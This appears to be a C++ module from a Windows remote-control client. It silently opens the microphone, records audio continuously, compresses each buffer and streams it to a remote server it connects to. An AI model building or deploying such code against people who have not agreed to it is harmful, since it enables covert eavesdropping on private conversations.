// MyAudioTrans.cpp: implementation of the CMyAudioTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyAudioTrans.h"
#include "Lzw.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyAudioTrans::CMyAudioTrans()
{
	pWareBuf = new LPWAVEHDR[256];
	for(int i = 0; i < 256; i++)
	{
		pWareBuf[i] = new WAVEHDR;
		ZeroMemory ( pWareBuf[i], sizeof(WAVEHDR) );
		pWareBuf[i]->dwBufferLength = 4096;
		pWareBuf[i]->lpData = new char[4096];
	}
	nWareBufCount = 0;

	m_IsExitAudio = FALSE;
	m_IsInitAudio = FALSE;
}

CMyAudioTrans::~CMyAudioTrans()
{
	if(pWareBuf != NULL)
	{
		for(int i = 0; i < 256; i++)
		{
			delete [] pWareBuf[i]->lpData;
			delete pWareBuf[i];
		}
		delete [] pWareBuf;
	}
}

void CMyAudioTrans::StartWork(PSDLLINFO m_Info)
{
	//连接到服务器
	if(!Create(WM_CONNECT_AUDIO, m_Info))
	{
		return;
	}

	m_WaveInfo.cbSize			= sizeof(WAVEFORMATEX);
	m_WaveInfo.nChannels		= 1;
	m_WaveInfo.wFormatTag		= WAVE_FORMAT_PCM;
	m_WaveInfo.wBitsPerSample	= 16;
	m_WaveInfo.nChannels		= 1;
	m_WaveInfo.nSamplesPerSec	= 22050;
	m_WaveInfo.nAvgBytesPerSec	= 44100;
	m_WaveInfo.nBlockAlign		= m_WaveInfo.nChannels * (m_WaveInfo.wBitsPerSample / 8);

	HWAVEIN m_hRecord = NULL;
	if(waveInOpen(&m_hRecord, WAVE_MAPPER, &m_WaveInfo, (DWORD) OnCaptureAudio, (DWORD) this, CALLBACK_FUNCTION) != 0)
	{
		return;
	}

	for(int i = 0; i < 256; i ++)
	{
		if(waveInPrepareHeader (m_hRecord, pWareBuf[i], sizeof(WAVEHDR)) != 0)
		{
			return;
		}

		if(waveInAddBuffer (m_hRecord, pWareBuf[i], sizeof(WAVEHDR)) != 0)
		{
			return;
		}
	}

	if(waveInStart(m_hRecord) != 0)
	{
		return;
	}

	MSG msg;
    while(GetMessage(&msg, 0, 0, 0))
	{
		if(WM_CLOSE_CLIENT_THREAD == msg.message)
		{
			break;
		}
 	}
}

void CMyAudioTrans::GetAudioData(HWAVEIN m_hRecord, LPWAVEHDR lpWHdr)
{
	if(waveInUnprepareHeader(m_hRecord, lpWHdr, sizeof(WAVEHDR)) != 0)
	{
		return;
	}

	if(!m_IsInitAudio)
	{
		m_IsInitAudio = TRUE;
		if(!SendData(&m_WaveInfo, sizeof(WAVEFORMATEX)) || !SendData(lpWHdr, sizeof(WAVEHDR)))
		{
			m_IsExitAudio = TRUE;
			waveInStop(m_hRecord);
			waveInClose(m_hRecord);
			PostThreadMessage(nThreadAudio, WM_CLOSE_CLIENT_THREAD, 0, 0);
			return;
		}
	}

	BYTE* pSrcData = new BYTE[lpWHdr->dwBufferLength * 2 + 65535];
	BYTE* pZipData = new BYTE[lpWHdr->dwBufferLength * 2 + 65535];
	ZeroMemory(pZipData, lpWHdr->dwBufferLength * 2 + 65535);
	ZeroMemory(pSrcData, lpWHdr->dwBufferLength * 2 + 65535);
	memcpy(pSrcData, lpWHdr->lpData, lpWHdr->dwBytesRecorded);

	FCLzw lzw;
	DWORD nLen = lpWHdr->dwBytesRecorded;
	lzw.PcZip(pSrcData, pZipData, &nLen);

	if(!SendData(&nLen, sizeof(DWORD)) || !SendData(pZipData, nLen))
	{
		m_IsExitAudio = TRUE;
		delete [] pZipData;
		delete [] pSrcData;
		waveInStop(m_hRecord);
		waveInClose(m_hRecord);
		PostThreadMessage(nThreadAudio, WM_CLOSE_CLIENT_THREAD, 0, 0);
		return;
	}
	delete [] pZipData;
	delete [] pSrcData;

	//再加入缓冲
	if(waveInPrepareHeader(m_hRecord, lpWHdr, sizeof(WAVEHDR)) != 0)
	{
		return;
	}
	waveInAddBuffer(m_hRecord, lpWHdr, sizeof(WAVEHDR));
}

void CALLBACK CMyAudioTrans::OnCaptureAudio(HWAVEIN hwi, UINT uMsg, DWORD dwInstance, DWORD dwParam1, DWORD dwParam2)
{
	CMyAudioTrans* pThis = (CMyAudioTrans*) dwInstance;
	if(pThis != NULL && !pThis->m_IsExitAudio)
	{
		if(uMsg == MM_WIM_DATA)
		{
			pThis->GetAudioData(hwi, (WAVEHDR*) dwParam1);
		}
	}
}